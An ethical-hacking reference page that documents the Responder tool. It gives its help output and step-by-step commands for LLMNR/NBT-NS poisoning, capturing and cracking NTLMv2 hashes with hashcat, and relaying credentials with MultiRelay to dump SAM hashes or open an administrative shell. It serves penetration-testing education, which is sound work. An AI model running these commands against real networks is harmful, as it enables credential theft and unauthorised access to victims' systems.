---
title: Responder
categories: [Ethical Hacking Tools,Credential Access]
tags: [responder, credential access (TA0006), llmnr, nbt-ns, mdns, aitm, mitm, hashcat, ntlmv2]
comments: true
---

# Overview

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.

Responder come packaged with Kali Linux by default. [^1]

| Tool Name | Version | MITRE ATT&CK Tactic | MITRE ATT&CK Technique |
| --------- | ------- | ------------------- | ---------------------- |
| [Responder.py](https://github.com/lgandx/Responder) | v3.1.3.0 | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Adversary-in-the-Middle]() |

# Responder Help Page

```bash
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.
```
{: .nolineno }

# Instructions

## Using Responder to Perform LLMNR Poisoning

Execute the below command on the attacker machine. Ensure that the `-I` switch is set to interface that is on the same network as the target.

```bash
# Running the listener will wait for a host to make a request
sudo responder -I ens33 -wd
```
{: .nolineno }

Once a set of NTLMv2 credentials have been collection, the password can be attempted to be cracked.

### Cracking NTLMv2 Credentials with HashCat

With the previously obtained NTLMv2 credential hash collected and saved to a text file. It can be parsed through a credential cracking utility such as hashcat.

```bash
hashcat -m 5600 -a 0 /PATH/TO/DUMP.txt /usr/share/wordlists/rockyou.txt 
```
{: .nolineno }

## Using Responder-Finger and Responder-MultiRelay

Responder comes packaged with additional tools can be used together with Responder to perform other tasks, such as relaying NTLMv2 credentials to gain authenticated access via SMB without the requirement to crack a collected NTLMv2 password hash. The below example shows how to identify systems that don't require SMB signing (a requirement for this method to work) using `Responder-Finger` and setup the `Responder-MultRelay` to gain authenticated access to another host. Local Administrative privileges is however a requirement for the process to work.

This will require three hosts; the attacker, the requesting LLMNR victim, and the target.

1. Configure the Responder configuration file located at `/etc/Responder/Responder.conf` (On Kali Linux) to disable SMB and HTTP sever instances.

    ```conf
    SMB = Off
    HTTP = Off
    ```

2. Start Responder to listen for LLMNR requests. Ensure that the `-I` switch is set to interface that is on the same network as the target.

    ```bash
    sudo responder -I ens33 -wd
    ```
    {: .nolineno }

3. Identify hosts on the target network that have SMB signing disabled, the `-i` switch requires the subnet to search. Once the results are returned, identify any hosts that return `SMB signing: False`. If none are returned, this method will not work and NTLMv2 credentials will need to be cracked instead.

    ```bash
    sudo responder-RunFinger.py -i 10.10.10.1/24
    ```
    {: .nolineno }

4. Start the MultiRelay to relay the NTLMv2 credentials to any target host identified in step 3. In this example, `10.10.10.10` was identified to have SMB signing disabled and is therefore used as the target `-t`. The `-d` switch will instruct the MultiRelay tool to dump the local password hashes. The `-d` switch can be omitted which will instead return an administrative shell to the target machine.

    ```bash
    sudo responder-MultiRelay.py -t 10.10.10.10 -u ALL -d
    ```
    {: .nolineno }

5. If the `-d` switch was omitted in step 4, an interactive shell will be returned allowed the following commands.

   - Dump: Extract the SAM database and print hashes
   - regdump KEY: Dump a HKLM registry key
   - read: Read a file
   - get: Download a file
   - delete: Delete a file
   - Upload: Upload a local file to `\windows\temp\`
   - runas: Run a command as the currently logged on user
   - scan: Performs a scan using SMB for other local targets (use /24 or /26 to limit scope)
   - mimi: Run a remote Mimikatz 64 command
   - mimi32: Run a remote Mimikatz 32 command
   - lcmd: Run a local command 

# Sources
[^1]: [Kali - Responder](https://www.kali.org/tools/responder/)